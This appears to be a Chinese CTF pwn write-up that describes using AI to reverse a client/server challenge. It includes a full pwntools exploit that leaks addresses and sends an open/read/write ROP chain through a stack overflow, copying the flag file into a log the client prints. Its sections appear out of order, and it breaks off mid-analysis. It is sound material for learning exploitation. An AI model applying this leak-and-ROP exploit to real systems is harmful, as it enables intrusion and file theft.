
![图片描述](upload/attach/202511/857736_VCCQ4FCC97P5MTX.webp)

## 漏洞利用

在所有的指令功能都分析完之后，其实已经比较清晰了，先用 `oracle` 泄露地址，然后在利用 `exec` 的栈溢出漏洞。

AI 也给了攻击流程，和最终实现的 exp 已经没有太大差别了

```text
┌─────────────────────────────────────────────────────┐
│ 攻击流程 │
└─────────────────────────────────────────────────────┘
1. CMD_HELLO (0x01)
↓
获取 session_key
↓
2. CMD_REGISTER_PROFILE (0x10)
↓
认证成功 (oracle_unlock)
↓
3. oracle_guess (CMD_EXEC_OP param=0x1337)
↓
暴力破解 magic_table[0..7]
↓
4. oracle_leak (CMD_EXEC_OP)
↓
泄露栈地址、堆地址、canary
↓
5. CMD_EXEC_OP (param=0x42, op_code=0x41)
↓
触发栈溢出
↓
6. ROP Chain执行
↓
获取Shell
```

题目开了沙箱，禁用了 `exec`，由于我们无法直接和 `server` 交互，所以不能用常规的 orw 来读 `flag`

![图片描述](upload/attach/202511/857736_CWYQ56HTXTHM63P.webp)

结合 `client` 程序在启动的时候会读取并输出 `client.log` 的文件内容，可以把 `flag` 内容写入到 `client.log` 文件，`rop` 执行之后，再启动一个终端 `nc` 就能拿到 `flag`

![图片描述](upload/attach/202511/857736_95CR8FNDA99YDJD.webp)

```python
#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
from pwnkit import \*
from pwnkit.osys.linux.ropbox import GadgetBox
import binascii
args = init\_pwn\_args()
binary = ELF("./bin/server")
args.info.binary = context.binary = binary
args.info.target = {"host": args.host or "example.pwnme", "port": args.port or 9999}
p = remote("127.0.0.1", 8888)
def run(cmd):
p.sendlineafter(b"> ", cmd)
run(b"hello")
run(b"oracle\_unlock")
run(b"register aaa")
run(b"list")
p.recvuntil(b"count=")
num = int(p.recvline())
for i in range(num):
idx = p.recvline().strip()[2:]
idx = int(idx)
log.info("latest idx: %d", idx)
run(f"oracle\_leak {idx} 8".encode())
p.recvuntil(b"addr=")
text\_leak = p.recvline().strip()
text\_leak = int(text\_leak, 16)
text\_base = text\_leak - 0x2e60
plog.address(text\_leak=text\_leak, text\_base=text\_base)
gb = GadgetBox(binary)
pop\_rdi\_ret = text\_base + next(gb.search\_gadget(["pop rdi", "ret"]))
pop\_rsi\_r15\_ret = text\_base + next(gb.search\_gadget(["pop rsi", "pop r15", "ret"]))
add\_edx\_edi\_ret = text\_base + 0x2a94 # 0x0000000000002a94: add edx, edi; nop; ret;
add\_rsp\_0xc0\_ret = text\_base + 0x2a84 # 0x0000000000002a84: add rsp, 0xc0; ret;
open\_addr = text\_base + binary.plt["open"]
read\_addr = text\_base + binary.plt["read"]
write\_addr = text\_base + binary.plt["write"]
""" open/read/write rop """
path\_flag = text\_base + 0xc000 + 0x10
path\_log = path\_flag + 15
buf = text\_base + 0xc000 + 0x100 # read buf
size = 0x100
payload = b"/home/ctf/flag\x00"
payload += b"/home/ctf/client.log\x00"
payload = payload.ljust(64, b"\x00")
payload += p64(add\_rsp\_0xc0\_ret)
# int fs = open(path, O\_RDONLY, NULL)
payload += p64(pop\_rdi\_ret) + p64(path\_flag) # rdi = "/path/to/flag"
payload += p64(pop\_rsi\_r15\_ret) + p64(0) + p64(0) # rsi = 0 == O\_RDONLY
payload += p64(open\_addr)
# int fs = open(path, O\_RWONLY, NULL)
payload += p64(pop\_rdi\_ret) + p64(path\_log) # rdi = "/path/to/flag"
payload += p64(pop\_rsi\_r15\_ret) + p64(1) + p64(0) # rsi = 0 == O\_RDONLY
payload += p64(open\_addr)
# read(fs, buf, size)
payload += p64(pop\_rdi\_ret) + p64(0x100) + p64(add\_edx\_edi\_ret) # edx = 0x100
payload += p64(pop\_rdi\_ret) + p64(5) # rdi = fs
payload += p64(pop\_rsi\_r15\_ret) + p64(buf) + p64(0) # rsi = buf
payload += p64(read\_addr)
# write(1, buf, size)
payload += p64(pop\_rdi\_ret) + p64(6) # rdi = fs
payload += p64(pop\_rsi\_r15\_ret) + p64(buf) + p64(0) # rsi = buf
payload += p64(write\_addr)
data = p8(0x41) + p32(len(payload)) + payload
run(f"exechex {idx} 2 {binascii.hexlify(data).decode()}")
p.interactive()
p.close()
```

![图片描述](upload/attach/202511/857736_H4UV2BM6XZ5WNQ9.webp)

## 总结

整个复现过程，基本上只有 `rop` 是自己写的，绝大部分的分析过程都是 AI 在做，人工主要是测功能和指导 AI 的分析方向。目前 AI 针对一些比较小的程序，分析效果还是不错的。

本文进行一次利用 AI 从一点没看到独立复现 2 解题目的尝试，这里分享一下思路。题目本身的主要难度在逆向层面，需要分析每一个指令的参数和功能，并能找到指令中的漏洞

## 功能分析

### 基本信息

拿到题目之后看一下基本信息，`docker` 里在后台运行了 `bin/server` 程序，然后 `xinetd` 监听 `8888` 端口，启动 `bin/client` 程序。我们需要使用 `nc` 和 `client` 交互，`client` 再和 `server` 交互。

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8 | `.`  `├── bin`  `│   ├── client`  `│   └── server`  `├── ctf.xinetd`  `├── docker-compose.yml`  `├── dockerfile`  `└── start.sh` |

先 `nc` 上去看一下，这里是提前看了下字符串随便试了试，看起来像是从 `client` 向 `server` 发送 `cmd` 指令

![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_TPKZXUAVHEGUCQN.webp)

经过几轮对话，让 AI 分析 `client`/`server` 的逻辑，基本功能就比较清晰了

![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_BFNRGJPP2QV3MWM.webp)
![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_ECE7XUPPDU2YRVG.webp)

- `server`：接收到数据包后通过使用 `handle_client_protocol` 函数解析，具体 `CMD` 使用 `dispatch_command_handler` 处理，根据 `CMD` ID 进入不同的逻辑
![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_BWJ4EFREEZ6BUYN.webp)
- `client`：封装用户指令成数据包后和 `server` 交互
![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_DNQ5A2HDRTCBRER.webp)

### CMD ID 表格

接下来我们去分析每一个 `CMD` 对应的 `ID`，不过 AI 一开始并没有给出 `ID`，我们需要人工干预一下。

![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_3GAFUX7RCJZNX6T.webp)

继续让 AI 整理一下这两张表就有

| 命令名称 | 命令 ID | 功能描述 | 参数说明 | 数据包格式 |
| --- | --- | --- | --- | --- |
| help | - | 显示帮助信息 | 无参数 | 无 |
| hello | 1 | 发送 hello 消息 | ​[client_name]​（可选，默认为"client"） | ​[client_name]​ |
| register | 16 | 注册操作（字符串方式） | ​ | ​[4B 长度][数据]​ |
| register_hex | 16 | 注册操作（十六进制方式） | ​ | ​[4B 长度][数据]​ |
| list | 22 | 列出所有项目 | 无参数 | 无 |
| partial_delete | 19 | 部分删除操作 | ​ | ​[4B id1][4B id2]​ |
| show | 20 | 显示指定项目 | ​ | ​[4B id]​ |
| update | 17 | 更新操作 | ​ | ​[4B id1][4B id2][4B 长度][数据]​ |
| exec | 18 | 执行命令 | ​ | ​[4B id][2B param][4B 长度][数据]​ |
| exechex | 18 | 执行命令（十六进制参数） | ​ | ​[4B id][2B param][4B 长度][数据]​ |
| execf | 18 | 执行命令（带指针参数） | ​ | ​[4B id][2B param][4B 长度][数据]​ |
| oracle_unlock | - | Oracle 解锁功能 | 无参数 | 无 |
| oracle_guess | 18 | Oracle 猜测字节 | ​ | ​[4B pid][2B 0x3733][4B 长度][payload]​ |
| oracle_leak | 18 | Oracle 泄露字节 | ​ | ​[4B id][4B长度][数据]​ |
| bye | 255 | 退出程序 | 无参数 | 无 |

### CMD 功能分析

`CMD` 的 `ID` 和参数格式都有了，接下来分析每个指令的详细功能

#### 指令功能

##### CMD 1: hello

功能 : 初始化会话并生成会话密钥
- 从客户端数据中提取客户端名称
- 生成一个随机的会话密钥(`generate_session_key`)
- 将会话密钥存储在 `SessionManager` 中
- 设置响应状态码为 2
- 返回 8 字节的会话密钥(大端序)和 "WELCOME" 字符串
- 输出会话密钥到 `stdout`(十六进制格式)

关键代码路径 :

|  |  |
| --- | --- |
| 1  2  3  4  5  6 | `session_key = generate_session_key(qword_FA40);`  `*a8 = session_key;` `// 存储会话密钥`  `*a9 = session_key;`  `srv->session_mgr->session_key = session_key;`  `*a10 = 2;` `// 状态码`  `// 返回: [8字节会话密钥] + "WELCOME"` |

##### CMD 16: register

功能 : 注册一个新的 `Profile`
- 读取客户端发送的字符串数据(长度 ≥ 4 字节)
- 验证数据长度是否充足
- 计算数据的 CRC 32 校验值
- 与固定值 `0x13579BDF` 异或后比较校验和
- 如果校验通过,设置会话管理器的标志位
- 调用 `create_profile` 创建新的 `Profile`
- 返回 "OK" + 4 字节的 `Profile ID`

关键验证逻辑 :

|  |  |
| --- | --- |
| 1  2  3  4  5 | `crc32_value = calculate_crc32(data, length);`  `if` `((session_mgr->session_key ^ 0x13579BDF) == crc32_value) {`  `session_mgr->session_key |= 0x0100;` `// 设置标志位`  `profile_id = create_profile(session_mgr, data);`  `}` |

返回 : "OK" + [4 字节 `Profile ID`]

##### CMD 19: partial_delete

功能 : 删除指定 `Profile` 中的指定 `Blob`
- 检查是否已经使用过此命令(只能使用一次)
- 读取两个 4 字节参数: `id1`(`Profile ID`) 和 `id2`(`Blob ID`)
- 查找对应的 `Profile`
- 在 `Profile` 的 `Blob` 列表中查找指定的 `Blob`
- 将 `Blob` 的第二个 `vector` 清空(通过设置 `end = start`)
- 设置一个标志表示已删除
- 随机分配 0-2 个虚假的内存块(大小 8-71 字节)后立即释放
- 返回 "Delete done"

关键限制 :
- `LOBYTE(session_mgr->session_key) == 0` 必须为真(只能调用一次)
- 调用后设置 `LOBYTE(session_mgr->session_key) = 1`

可能的漏洞点 : `Blob` 的 `end` 指针被设置为 `start`,但内存未释放,可能导致 Use-After-Free

##### CMD 20: show

功能 : 显示指定 `Profile` 的所有 `Blob` 数据
- 读取 4 字节的 `Profile ID`
- 查找对应的 `Profile`
- 检查 `Profile` 是否被标记为已删除(`*(v117 + 64) != 0`)
- 将所有 `Blob` 的数据拼接后返回
- 返回: "OK" + [4 字节总长度] + [所有 `Blob` 数据]

数据格式 :

|  |  |
| --- | --- |
| 1 | `"OK"` `+` `[4B length]` `+` `[blob1_data][blob2_data]...` |

##### CMD 17: update

功能 : 更新或创建 `Blob`
- 读取参数: `id1`(`Profile ID`), `id2`(`Blob ID`), `data`
- 查找对应的 `Profile` 和 `Blob`
- 如果 `Blob` 存在,更新其数据
- 如果 `Blob` 不存在且数量 < 64,创建新 `Blob`
- 分配 0-2 个随机大小的内存块(8-71 字节)后立即释放
- 返回 "OK" + 原始的 `id1` 和 `id2`

`Blob` 数量限制 : 最多 64 个(`(v152 - v151) <= 0x3F`)

##### CMD 18: exec/exechex/execf

功能 : 执行操作或验证魔术字节
